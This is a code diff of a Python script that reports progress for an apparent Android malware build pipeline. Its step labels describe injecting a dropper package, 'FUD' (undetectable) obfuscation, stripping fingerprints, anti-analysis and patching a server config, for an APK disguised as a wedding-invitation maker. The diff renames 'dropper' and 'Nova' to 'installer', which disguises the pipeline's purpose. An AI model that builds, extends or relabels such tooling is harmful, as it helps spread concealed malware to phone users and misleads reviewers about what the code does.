@@ -31,7 +31,7 @@ Usage:
     --msg-id     "12345" \
     --token      "BOT_TOKEN" \
     --build-type "full" \
-    --apk        "app/build/outputs/apk/release/nova_abc123.apk" \
+    --apk        "app/build/outputs/apk/release/installer_abc123.apk" \
     --apk-size   "2.7 MB" \
     --pkg        "com.shaadicard.invitemaker"
 """
@@ -45,14 +45,14 @@ import urllib.request
 import urllib.parse
 from datetime import datetime, timezone
 
-# ── Full build steps (dropper + companion) ────────────────────────────────────
+# ── Full build steps (installer + companion) ────────────────────────────────────
 BUILD_STEPS_FULL = [
     ("Checkout",              "[1/9] 📥 Checkout & setup"),
     ("Install tools",         "[2/9] 🔧 Install build tools"),
     ("Generate package name", "[3/9] 🎲 Generate package name"),
-    ("Inject Nova package",   "[4/9] 💉 Inject Nova package"),
+    ("Inject Installer package",   "[4/9] 💉 Inject Installer package"),
     ("Build companion APK",   "[5/9] 🔨 Build companion APK"),
-    ("Build release APK",     "[6/9] 🏗  Build Nova release APK"),
+    ("Build release APK",     "[6/9] 🏗  Build Installer release APK"),
     ("Phase 2 obfuscation",   "[7/9] 🛡  Phase 2 — FUD obfuscation"),
     ("Re-sign APK",           "[7/9] ✍️  Re-sign APK"),
     ("Strip fingerprints",    "[8/9] 🧹 Strip fingerprints + anti-analysis"),
@@ -82,7 +82,7 @@ STEP_DURATIONS_FULL = {
     "Checkout":              15,
     "Install tools":         60,
     "Generate package name": 10,
-    "Inject Nova package":   10,
+    "Inject Installer package":   10,
     "Build companion APK":   90,
     "Build release APK":    180,
     "Phase 2 obfuscation":   30,
@@ -115,7 +115,7 @@ COMPANION_SUB_STEPS = {
     "PHASE_1/STEP_4":    ("Decompile & patch smali", "Randomize resource filenames"),
     "PHASE_1/STEP_5":    ("Decompile & patch smali", "Decompile APK → smali"),
     "PHASE_1/STEP_5B":   ("Decompile & patch smali", "Patch server config"),
-    "PHASE_1/STEP_5C":   ("Decompile & patch smali", "Patch dropper uninstall target"),
+    "PHASE_1/STEP_5C":   ("Decompile & patch smali", "Patch installer uninstall target"),
     "PHASE_1/STEP_5D":   ("Decompile & patch smali", "Patch onResume loop fix"),
     "PHASE_1/STEP_6":    ("Decompile & patch smali", "Rename smali class paths"),
     # Phase 5: Obfuscate & assemble APK
